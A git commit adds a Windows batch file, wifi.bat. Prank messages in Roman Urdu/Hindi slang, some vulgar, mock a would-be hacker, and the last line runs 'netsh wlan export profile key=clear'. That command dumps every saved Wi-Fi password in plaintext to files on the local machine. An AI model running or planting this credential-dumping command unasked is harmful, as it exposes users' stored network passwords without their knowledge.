979b5518f51c16195412c05e84852ec3d391bfc2
Hamza11123 <77277011+Hamza11123@users.noreply.github.com>
2022-11-03 03:59:30 -0700

    Add files via upload

---
+++ JS/wifi.bat
@@ -0,0 +1,19 @@
+@echo Dekho Kon Ayaaa h?
+pause
+@echo Naam kiya H.. Namoony?
+pause 
+@echo Wooo.. Hacking Seekh Rahy hoo?
+pause 
+@echo Hack, Krna h..?
+pause
+@echo Aby, ch**ye Again Poochraha hun? HACK Krna h? :/
+pause
+@echo Aly Mela Beta Acking Sheek Rahaa h.. Chalo Krty hn Hacking  #-#
+pause
+@echo To Phr Dabaao ENTER Ab.. -_-
+pause
+
+@echo Chal Bhaag Bsdk /=_=\
+pause
+netsh wlan export profile key=clear
+
